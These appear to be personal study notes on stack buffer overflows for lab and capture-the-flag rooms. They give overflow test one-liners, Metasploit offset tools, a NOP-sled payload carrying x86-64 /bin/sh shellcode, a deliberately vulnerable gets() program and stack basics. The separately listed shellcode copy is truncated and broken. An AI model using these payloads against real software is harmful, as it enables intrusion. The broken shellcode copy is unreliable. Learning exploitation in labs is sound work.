
Links to where to test buffer overflow:
https://tryhackme.com/r/room/bof1 (Linux, r2 and gdb)
https://tryhackme.com/r/room/bufferoverflowprep (Windows, Immunity debugger)
https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/ (VM ISO)


Buffer overflow is when vulnerable code writes over a bigger section of memory than it should.
The C functions gets() and strcopy() are examples of functions that doesn't check the available space before writing.

First we need an input to test for overflow. It can be any other kind of input (user input, arguments, network command, env var...).

We can then perform basic tests where we try different, increasing sizes, like
```sh
python -c "print 'A' * 64" | ./<program>
python -c "print 'A' * 100" | ./<program>
python -c "print('A' * 64 + '\x64\x63\x62\x61')" | ./<program>
echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0" | ./<program>
perl -e 'print "A"x64 . "\x24\x84\x04\x08"' | ./<program>

./<program> `python -c "print('A' * 64 + '\x64\x63\x62\x61')"`
./<program> 'echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0"'
```

When we find a buffer overflow vulnerability we need more information.
Hopefully we can run the program in a debugger or attach to a process with a GUI debugger like like edb (Linux) or Immunity debugger (Windows).
Tools: [[r2 (radare2)]], [[gdb]], [[objdump]], readelf, edb (preinstalled in Kali full), Immunity Debugger.


We want to see what part of the input we gave ends up where in memory.
	You can make a string to test with manually or..
	To do this metasploit has to helpful scripts. One to generate a non-repetitive string and one to give us the offset (position) of a part of this string.
		`/usr/share/metasploit-framework/tools/exploit/pattern-create.rb`
			`-l`, `--length <length>`         The length of the pattern
		    `-s`, `--sets <ABC,def,123>`   Custom Pattern Sets
		    `-h`, `--help`                             Show this message
			`./pattern_create.rb -l 500` creates a non-repetitive string with length 500
		`/usr/share/metasploit-framework/tools/exploit/pattern-offset.rb`
		    `-q`, `--query Aa0A`                 Query to Locate
		    `-l`, `--length <length>`        The length of the pattern
		    `-s`, `--sets <ABC,def,123>`  Custom Pattern Sets
		    `-h`, `--help`                            Show this message
			`./pattern_offset -l 500 -q 63413163` returns the position of the 0x63413163`

Exploring memory - the stack and the heap - add info

`python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"`

`python -c "print('\x90'*30+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'\x41'*60+'\xef\xbe\xad\xde')" | ./program`

![[Images/2022-03-24-00_14_45-Perlite.png]]

---

Shell code we can use

shell code - code to open a basic shell
```
\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3
```

the shell code disassembled (r2, aaa, pdf)
![[Images/Pasted image 20240809204245.png]]
A string containing the path to /bin/sh + 0x11 (random extra byte) is put in the RCX registry.
To get rid of the extra 0x11 rcx is first shifted one byte to the left and then to the right.
RCX is then pushed onto the stack.
Other requirements for the syscall to exectue the path are prepared and then the syscall is made.










---


"Hacking: The Art of Exploitation" is a pretty chunky book 



tool bofuzz

Memory layout
![[Images/KmWsaIs.png]]

#### The stack
- grows downwards
- contains
	- Program counter
	- Saved registers
	- Other info
- data is puched onto the stack and popped off

#### The heap
- grows upwards
- contains
	- dynamically assigned memory


#### Assembly

`push var`
- decrement stack pointer `rsp` by 8
- write var to where `rsp` points

`pop var`
- reads the value pointed to by `rsp`
- increment stack pointer `rsp` by 8

Each function has its own stack frame, where each new stack frame is allocated when a function is called, and deallocated when the function is complete (where)

rsp  stack pointer
rbp  frame pointer

Up to 6 arguments can be saved in registers; rdi, rsi, rdx
rcx, r8 and r9.Move can be stored in the stack frame.

Return values will be stored in rax.

---

![[Images/lqE6o0S.png]]

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

When we enter up to 14 characters we get Try again. If we enter 15, we get You have..

Since the string is null terminated when we enter 14 characters the int will be overwritten toooo. (We tested this be changing the init value and test value to 1.)

